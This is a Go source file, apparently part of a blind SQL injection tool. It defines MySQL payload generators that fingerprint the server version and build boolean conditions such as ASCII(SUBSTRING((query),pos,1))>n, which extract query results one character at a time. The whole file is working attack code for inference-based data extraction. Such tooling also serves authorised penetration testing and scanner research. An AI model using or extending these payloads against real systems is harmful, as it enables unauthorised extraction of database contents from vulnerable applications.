package payloads

import "fmt"

// MySQLPayloads implements payloads for MySQL
type MySQLPayloads struct{}

func (m *MySQLPayloads) GetType() DatabaseType {
	return MySQL
}

func (m *MySQLPayloads) GetName() string {
	return "MySQL"
}

func (m *MySQLPayloads) GetVersionQueries() []string {
	return []string{
		"SELECT @@version",
		"SELECT version()",
		"SELECT @@version_compile_os",
	}
}

func (m *MySQLPayloads) GetLengthPayload(query string, n int) string {
	// LENGTH((query))>n - pure condition
	return fmt.Sprintf("LENGTH((%s))>%d", query, n)
}

func (m *MySQLPayloads) GetComparisonPayload(query string, n int) string {
	// (query)>n - pure numeric comparison
	return fmt.Sprintf("(%s)>%d", query, n)
}

func (m *MySQLPayloads) GetEqualityPayload(query string, pos int, charCode int) string {
	// ASCII(SUBSTRING((query),pos,1))=charCode
	return fmt.Sprintf("ASCII(SUBSTRING((%s),%d,1))=%d", query, pos, charCode)
}

func (m *MySQLPayloads) GetCharPayload(query string, pos int, n int) string {
	// ASCII(SUBSTRING((query),pos,1))>n - pure condition
	return fmt.Sprintf("ASCII(SUBSTRING((%s),%d,1))>%d", query, pos, n)
}

func (m *MySQLPayloads) GetSubstringFunc() string {
	return "SUBSTRING"
}

func (m *MySQLPayloads) GetLengthFunc() string {
	return "LENGTH"
}

func (m *MySQLPayloads) WrapCondition(condition string) string {
	return condition
}
